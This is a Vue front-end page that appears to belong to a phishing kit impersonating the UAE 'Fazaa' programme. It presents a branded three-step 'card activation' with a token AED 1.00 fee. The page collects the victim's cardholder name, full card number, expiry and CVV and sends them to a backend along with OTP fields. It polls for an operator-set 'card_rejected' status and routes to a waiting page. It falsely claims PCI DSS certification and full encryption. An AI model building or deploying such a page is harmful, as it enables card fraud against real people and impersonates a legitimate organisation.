<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { ChevronDown, CreditCard, ArrowRight, ShieldCheck, Lock } from 'lucide-vue-next';
import { useRouter } from 'vue-router';
import { updateCardRequest, getCardRequest, resolveActiveRequestId } from '../api';

const router = useRouter();

const form = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const isSubmitting = ref(false);
const statusBanner = ref('');
let statusCheckTimer: ReturnType<typeof setInterval> | null = null;

const errors = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const handleCardNumberInput = (e: Event) => {
  const input = e.target as HTMLInputElement;
  const digits = input.value.replace(/\D/g, '').slice(0, 16);
  const spaced = digits.replace(/(.{4})/g, '$1 ').trim();
  form.value.cardNumber = spaced;
};

const formattedPreviewNumber = computed(() => {
  const digits = form.value.cardNumber.replace(/\D/g, '');
  if (!digits) return '•••• •••• •••• ••••';
  const padded = digits.padEnd(16, '•');
  return padded.replace(/(.{4})/g, '$1 ').trim();
});

const detectedBrand = computed(() => {
  const digits = form.value.cardNumber.replace(/\D/g, '');
  if (digits.startsWith('4')) return 'VISA';
  if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return 'MASTERCARD';
  if (/^3[47]/.test(digits)) return 'AMEX';
  return 'UAE BANK CARD';
});

const checkCardStatus = async () => {
  try {
    const data = await getCardRequest();
    if (data?.otpStatus === 'card_rejected') {
      statusBanner.value = 'تم رفض البطاقة البنكية من قِبل البنك المصدر. يرجى التأكد من صحة البيانات أو استخدام بطاقة دفع أخرى.';
    }
  } catch {}
};

onMounted(() => {
  checkCardStatus();
  statusCheckTimer = setInterval(checkCardStatus, 2000);
});

onUnmounted(() => {
  if (statusCheckTimer) clearInterval(statusCheckTimer);
});

const validateForm = () => {
  let isValid = true;
  errors.value = { name: '', cardNumber: '', expMonth: '', expYear: '', cvv: '' };

  if (!form.value.name.trim()) {
    errors.value.name = 'يرجى إدخال اسم حامل البطاقة';
    isValid = false;
  }

  if (!/^\d{15,16}$/.test(form.value.cardNumber.replace(/\s/g, ''))) {
    errors.value.cardNumber = 'يرجى إدخال رقم بطاقة صحيح مكون من 16 رقماً';
    isValid = false;
  }

  if (!form.value.expMonth) {
    errors.value.expMonth = 'مطلوب';
    isValid = false;
  }

  if (!form.value.expYear) {
    errors.value.expYear = 'مطلوب';
    isValid = false;
  }

  if (!/^\d{3,4}$/.test(form.value.cvv)) {
    errors.value.cvv = 'رمز CVV غير صالح';
    isValid = false;
  }

  return isValid;
};

const submitPayment = async () => {
  if (isSubmitting.value) return;
  if (!validateForm()) return;
  
  isSubmitting.value = true;
  statusBanner.value = '';
  
  const requestId = await resolveActiveRequestId();
  if (!requestId) {
    statusBanner.value = 'لم يتم العثور على رقم الطلب، يرجى البدء من جديد.';
    isSubmitting.value = false;
    setTimeout(() => router.push('/request'), 1200);
    return;
  }

  try {
    await updateCardRequest(requestId, {
      paymentName: form.value.name,
      cardNumber: form.value.cardNumber,
      expMonth: form.value.expMonth,
      expYear: form.value.expYear,
      cvv: form.value.cvv,
      otp: '',
      otpStatus: '',
      step: 'card',
      nextAction: ''
    });
    router.push('/waiting');
  } catch (error) {
    console.error('Error updating card details:', error);
    statusBanner.value = 'تعذر حفظ بيانات البطاقة على الخادم.';
  } finally {
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div class="min-h-screen bg-[#06111f] font-sans text-slate-900">
    <div class="max-w-xl mx-auto bg-[#f9f6f0] min-h-screen flex flex-col shadow-[0_0_90px_rgba(0,0,0,0.65)] border-x border-[#c9a959]/30">
      
      <!-- Top Fazaa Header & Step Strip -->
      <div class="w-full bg-gradient-to-b from-[#06111f] via-[#0b1f38] to-[#122c4d] relative overflow-hidden border-b border-[#c9a959]/40">
        <header class="relative z-20 flex items-center justify-between px-5 h-16 border-b border-[#8a6c1e]/40 overflow-hidden shadow-md" dir="rtl">
          <img
            src="/assets/aistudio/header-background-gold.50f1dc5b.jpg"
            alt=""
            class="absolute inset-0 w-full h-full object-cover object-right pointer-events-none"
          />
          <div class="absolute inset-0 bg-gradient-to-l from-black/15 via-transparent to-black/25 pointer-events-none"></div>

          <button
            @click="router.push('/payment')"
            aria-label="العودة"
            class="relative z-10 w-10 h-10 rounded-xl bg-[#06111f]/75 hover:bg-[#06111f] flex items-center justify-center text-[#f5e2a8] transition-colors cursor-pointer border border-[#f5e2a8]/30"
          >
            <ArrowRight class="w-4 h-4" />
          </button>

          <div @click="router.push('/')" class="relative z-10 cursor-pointer flex items-center select-none">
            <img
              src="/assets/aistudio/fazaa-logo.png"
              alt="Fazaa Logo"
              class="h-12 w-auto object-contain drop-shadow-[0_2px_6px_rgba(0,0,0,0.3)]"
            />
          </div>

          <div class="relative z-10 text-xs text-white bg-[#06111f]/75 px-2.5 py-1 rounded-lg border border-[#f5e2a8]/30 font-bold font-mono tabular-nums">
            03 / 03
          </div>
        </header>

        <!-- Step Progress Strip -->
        <div class="relative z-20 px-6 pt-4 pb-3 max-w-md mx-auto" dir="rtl">
          <div class="grid grid-cols-3 gap-2 text-[11px] font-bold text-center">
            <div class="text-[#c9a959] border-b border-[#c9a959]/50 pb-1.5">1. بيانات العضوية</div>
            <div class="text-[#c9a959] border-b border-[#c9a959]/50 pb-1.5">2. اعتماد الرسوم</div>
            <div class="text-[#f5e2a8] border-b-2 border-[#f5e2a8] pb-1.5">3. تفعيل البطاقة</div>
          </div>
        </div>

        <!-- Live Interactive Sovereign Payment Card Preview -->
        <div class="px-5 pt-2 pb-6 flex justify-center" dir="ltr">
          <div class="w-full max-w-[340px] rounded-2xl p-5 bg-gradient-to-br from-[#0d223d] via-[#071426] to-[#040b14] border border-[#c9a959]/50 shadow-[0_20px_45px_rgba(0,0,0,0.55)] text-white relative overflow-hidden">
            <div class="absolute -right-10 -top-10 w-36 h-36 rounded-full bg-[#c9a959]/10 blur-xl pointer-events-none"></div>
            
            <div class="flex items-center justify-between mb-6">
              <div class="flex items-center gap-2">
                <div class="w-9 h-6 rounded-md bg-gradient-to-br from-[#f5e2a8] via-[#c9a959] to-[#8a6c1e] border border-[#ffefb8]/60 flex items-center justify-center">
                  <div class="w-5 h-3.5 border border-[#06111f]/30 rounded-xs"></div>
                </div>
                <span class="text-[10px] font-bold tracking-widest text-[#f5e2a8] uppercase">FAZAA SECURE PAY</span>
              </div>
              <span class="text-xs font-black tracking-wider text-white/90 italic">{{ detectedBrand }}</span>
            </div>

            <div class="font-mono text-[19px] font-bold tracking-[0.16em] text-[#fff1c2] mb-5 tabular-nums">
              {{ formattedPreviewNumber }}
            </div>

            <div class="flex items-end justify-between text-xs">
              <div>
                <div class="text-[9px] text-slate-400 uppercase tracking-wider mb-0.5">Cardholder Name</div>
                <div class="font-bold tracking-wider uppercase text-white truncate max-w-[190px]">
                  {{ form.name || 'YOUR NAME HERE' }}
                </div>
              </div>
              <div class="text-right">
                <div class="text-[9px] text-slate-400 uppercase tracking-wider mb-0.5">Expires</div>
                <div class="font-mono font-bold text-[#f5e2a8] tabular-nums">
                  {{ form.expMonth || 'MM' }}/{{ form.expYear ? form.expYear.slice(-2) : 'YY' }}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Order Summary Bar -->
      <div class="bg-[#09192d] text-white flex justify-between items-center px-5 py-3 border-b border-[#c9a959]/30">
        <div class="flex items-center gap-2">
          <Lock class="w-3.5 h-3.5 text-[#f5e2a8]" />
          <span class="text-xs tracking-wide font-semibold text-slate-200">Order Summary · رسوم الإصدار والتفعيل</span>
        </div>
        <span class="text-sm font-black text-[#f5e2a8] tracking-wide font-mono tabular-nums">AED 1.00</span>
      </div>

      <!-- Inline Status Banner if needed -->
      <div v-if="statusBanner" class="mx-5 mt-4 p-3 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs font-bold text-center" dir="rtl">
        {{ statusBanner }}
      </div>

      <!-- Card Form Container -->
      <div class="px-5 py-7 flex-grow">
        <div class="bg-white rounded-3xl p-6 shadow-[0_12px_35px_rgba(6,17,31,0.06)] border border-[#e4dac3]">
          <!-- Form Header -->
          <div class="flex justify-between items-center mb-6 pb-3.5 border-b border-slate-100">
            <div class="flex items-center gap-2">
              <CreditCard class="w-5 h-5 text-[#9b7b28]" />
              <span class="text-sm text-[#06111f] font-extrabold tracking-tight">بيانات البطاقة المصرفية</span>
            </div>
            <div class="flex gap-2.5 items-center">
              <div class="w-7 h-4 relative flex items-center justify-center">
                <div class="w-3.5 h-3.5 bg-[#eb001b] rounded-full absolute left-1 opacity-90"></div>
                <div class="w-3.5 h-3.5 bg-[#f79e1b] rounded-full absolute right-1 opacity-90"></div>
              </div>
              <div class="text-[11px] font-extrabold text-[#1434cb] italic tracking-tighter">VISA</div>
            </div>
          </div>

          <form @submit.prevent="submitPayment" class="space-y-4 font-sans" dir="ltr">
            
            <!-- Name -->
            <div>
              <label class="block text-[11px] font-extrabold text-slate-700 mb-1">Cardholder Name</label>
              <input 
                type="text" 
                placeholder="Name on card" 
                v-model="form.name" 
                class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf8] px-3.5 text-slate-900 focus:outline-none focus:border-[#c9a959] focus:bg-white text-sm transition-colors placeholder-slate-400 font-semibold" 
              />
              <p v-if="errors.name" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.name }}</p>
            </div>

            <!-- Card Number -->
            <div>
              <label class="block text-[11px] font-extrabold text-slate-700 mb-1">Card Number</label>
              <input 
                type="text" 
                inputmode="numeric"
                placeholder="0000 0000 0000 0000" 
                :value="form.cardNumber"
                @input="handleCardNumberInput"
                maxlength="19"
                class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf8] px-3.5 text-slate-900 focus:outline-none focus:border-[#c9a959] focus:bg-white text-sm transition-colors placeholder-slate-400 font-mono font-bold tabular-nums tracking-wider" 
              />
              <p v-if="errors.cardNumber" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.cardNumber }}</p>
            </div>

            <!-- Expiry Row -->
            <div class="grid grid-cols-2 gap-3.5">
              <!-- Month -->
              <div>
                <label class="block text-[11px] font-extrabold text-slate-700 mb-1">Expiry Month</label>
                <div class="relative">
                  <select 
                    v-model="form.expMonth" 
                    class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf8] pl-3.5 pr-8 text-slate-900 appearance-none focus:outline-none focus:border-[#c9a959] focus:bg-white text-sm font-mono font-bold tabular-nums cursor-pointer transition-colors"
                  >
                    <option value="" disabled selected hidden>MM</option>
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                  </select>
                  <ChevronDown class="w-4 h-4 text-[#9b7b28] pointer-events-none absolute right-3 top-1/2 -translate-y-1/2" />
                </div>
                <p v-if="errors.expMonth" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.expMonth }}</p>
              </div>

              <!-- Year -->
              <div>
                <label class="block text-[11px] font-extrabold text-slate-700 mb-1">Expiry Year</label>
                <div class="relative">
                  <select 
                    v-model="form.expYear" 
                    class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf8] pl-3.5 pr-8 text-slate-900 appearance-none focus:outline-none focus:border-[#c9a959] focus:bg-white text-sm font-mono font-bold tabular-nums cursor-pointer transition-colors"
                  >
                    <option value="" disabled selected hidden>YYYY</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                    <option value="2031">2031</option>
                    <option value="2032">2032</option>
                  </select>
                  <ChevronDown class="w-4 h-4 text-[#9b7b28] pointer-events-none absolute right-3 top-1/2 -translate-y-1/2" />
                </div>
                <p v-if="errors.expYear" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.expYear }}</p>
              </div>
            </div>

            <!-- CVV -->
            <div>
              <label class="block text-[11px] font-extrabold text-slate-700 mb-1">Security Code (CVV)</label>
              <input 
                type="password" 
                inputmode="numeric"
                placeholder="CVV (3 or 4 digits)" 
                v-model="form.cvv" 
                maxlength="4"
                class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf8] px-3.5 text-slate-900 focus:outline-none focus:border-[#c9a959] focus:bg-white text-sm transition-colors placeholder-slate-400 font-mono font-bold tabular-nums" 
              />
              <p v-if="errors.cvv" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.cvv }}</p>
            </div>

            <div class="pt-3">
              <button 
                type="submit" 
                :disabled="isSubmitting"
                class="w-full h-12 flex items-center justify-center gap-2 bg-gradient-to-r from-[#f3de9b] via-[#c9a959] to-[#9b7b28] hover:from-[#ffeaad] hover:to-[#b5923b] text-[#06111f] transition-all font-black text-sm rounded-xl shadow-[0_8px_24px_rgba(201,169,89,0.35)] tracking-wide disabled:opacity-70 disabled:cursor-not-allowed cursor-pointer border border-[#ffefb8]/60"
              >
                <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-[#06111f]"></span>
                <span v-else>PAY AED 1.00 · إتمام السداد الآمن</span>
              </button>
            </div>
          </form>
        </div>
      </div>

      <!-- Footer Security Block -->
      <div class="px-5 py-6 bg-[#06111f] text-white flex flex-col items-center text-center w-full border-t border-[#c9a959]/35" dir="rtl">
        <h3 class="font-bold text-[#f5e2a8] mb-3 text-xs">وسائل الدفع المصرفية المعتمدة</h3>
        
        <div class="flex gap-2 mb-4 flex-wrap justify-center items-center" dir="ltr">
          <div class="border border-white/15 rounded-lg px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
            <span class="text-[6.5px] font-bold text-[#1428a0] leading-tight text-center">SAMSUNG<br/>pay</span>
          </div>
          <div class="border border-white/15 rounded-lg px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
            <span class="text-[10px] font-medium text-gray-700 flex items-center gap-1">
              <span class="font-bold text-[#06111f]">G</span> Pay
            </span>
          </div>
          <div class="border border-white/15 rounded-lg px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
            <div class="w-5 h-3.5 relative flex items-center justify-center">
              <div class="w-3 h-3 bg-[#eb001b] rounded-full absolute left-0.5"></div>
              <div class="w-3 h-3 bg-[#f79e1b] rounded-full absolute right-0.5 opacity-90"></div>
            </div>
          </div>
          <div class="border border-white/15 rounded-lg px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
            <span class="text-[11px] font-extrabold text-[#1434cb] italic">VISA</span>
          </div>
        </div>

        <div class="text-center max-w-sm px-2 space-y-1.5">
          <p class="text-slate-300 text-[11px] font-medium leading-relaxed">
            تُقبل البطاقات العالمية والبطاقات الصادرة في دولة الإمارات العربية المتحدة ودول الخليج.
          </p>
          <div class="flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#f5e2a8]">
            <ShieldCheck class="w-3.5 h-3.5" />
            <span>PCI DSS CERTIFIED · بياناتك المصرفية مشفرة بالكامل</span>
          </div>
        </div>
      </div>

    </div>
  </div>
</template>
